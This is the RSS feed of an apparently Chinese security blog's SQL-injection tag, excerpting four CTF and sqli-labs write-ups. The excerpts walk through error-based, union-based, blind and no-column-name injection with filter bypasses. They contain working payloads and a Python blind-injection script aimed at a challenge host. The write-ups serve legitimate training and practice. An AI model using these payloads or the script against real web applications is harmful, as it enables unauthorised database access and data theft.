<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sql注入 on </title>
    <link>/tags/sql%E6%B3%A8%E5%85%A5/</link>
    <description>Recent content in Sql注入 on </description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate>
    <atom:link href="/tags/sql%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CISCN线上赛库存</title>
      <link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
      <pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate>
      <guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
      <description>easy_sql 在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合&#xA;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&#xA;过滤的字符有union，所以尝试报错注入，查询版本号。&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&#xA;最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&#xA;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39; 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</description>
    </item>
    <item>
      <title>极客大挑战 2019 FinalSQL</title>
      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link>
      <pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate>
      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid>
      <description>还是同一场比赛的界面&#xA;这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：你可别被我逮住了，臭弟弟，测试上面的序号，注意此时的url中有?id=猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个数字型注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。&#xA;发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。&#xA;贴出来自己的脚本：&#xA;# codeing=utf-8 import requests import time url=&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39; result=&amp;#39;&amp;#39; for x in range(1, 100): high = 127 low = 32 mid = (low + high) // 2 while high&amp;gt;low: # sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c) # sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid) sql = &amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid) time.sleep(0.1) reponse=requests.get(url+sql) if &amp;#34;Click&amp;#34; in reponse.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) 我是直接使用了判断字符的返回值1或0作为id的参数，因为使用group_concat拼接时字符串有逗号,所以字符ascii需要至少从44开始。&#xA;下面是查询到的两个表F1naI1y 、Flaaaaag及结构&#xA;F1naI1y ====&amp;gt; id,username,password</description>
    </item>
    <item>
      <title>SWPU2019 Web1</title>
      <link>/posts/ctf/swpu2019web1/</link>
      <pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate>
      <guid>/posts/ctf/swpu2019web1/</guid>
      <description>一个登陆界面，再看下url地址为login.php，确认了使用的是php&#xA;直接查看源码，在源码中找到了register.php。先注册一个进去看一看。&#xA;是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号&#39;试一试&#xA;广告详情中出现了数据库报错&#xA;猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是字符型单引号闭合。&#xA;接下来是尝试过滤。我试出来的有空格（使用/**/绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库information_schema没有办法查询，并且orderby也不能使用，需要使用其他办法获取表内容。&#xA;测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 LIMIT 0,1需要闭合，所以最后添加了一个单引号&#xA;&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; 说明回显位是2和3。&#xA;由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。这种没有办法查询表名的题目表名应该都不会设置太难&#xA;测试的语句&#xA;&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; 当测到users表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&#xA;首先讲解一波无列名注入。&#xA;先来个正常表（flag）的查询&#xA;我们知道在sql语句查询的时候，可以给列名起别名形如&#xA;使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名&#xA;所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造&#xA;需要为子查询的结果再起一个别名（图中为x），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用group_concat函数输出自己构造的表名。&#xA;所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&#xA;最终的payload：&#xA;&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; </description>
    </item>
    <item>
      <title>sql-labs(一)</title>
      <link>/posts/ctf/sql-labs1/</link>
      <pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate>
      <guid>/posts/ctf/sql-labs1/</guid>
      <description>前言 在线靶机地址：https://buuoj.cn/challenges#sqli-labs&#xA;less-1 ​&#x9;首先说明sql注入的大致步骤：&#xA;判断注入类型。如整型字符型注入等。 判断列数 判断数据的回显位 构造sql语句 ​&#x9;根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句?id=1&#39;，发现数据库报错&#xA;​&#x9;通过后面的报错语句1&#39;&#39; LIMIT 0,1的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询union插入我们想要查询的语句。&#xA;​&#x9;推出数据库的查询的部分语句可能为where id = &#39;$id&#39;LIMIT 0,1，那么通过构造闭合?id=1&#39; [这里添加语句] --+添加自己想要语句，语句后面的--+作用是将后面的其他语句注释掉。&#xA;​&#x9;首先是判断字段个数：?id=1&#39; order by 1 --+，页面显示正常，直到尝试?id=1&#39; order by 4 --+发现数据库报错&#xA;​&#x9;说明数据库的字段值只有四个。&#xA;​&#x9;接下来测试数据的回显位，构造语句?id=&#39; union select 1,2,3 --+，这里需要注意的有，前面id的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面union构造的语句就不会显示；union连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。&#xA;​&#x9;执行后页面显示。&#xA;​&#x9;说明查询语句的2,3是回显位，之后就可以将查询的语句进行替换。如：&#xA;​&#x9;获取数据库版本，数据库路径，当前用户，当前数据库： ​&#x9;?id=&#39; union select 1,concat_ws(&#39;_&#39;,user(),version(),database()),@@basedir --+&#xA;页面显示&#xA;​&#x9;利用元数据库来爆表、爆数据&#xA;​&#x9;?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&#xA;​&#x9;之后大家可以自行发挥。&#xA;​&#x9;flag的话我做的题是在ctftraining.flag表中，答案在：?id=&#39; union select 1,flag,3 from ctftraining.</description>
    </item>
  </channel>
</rss>
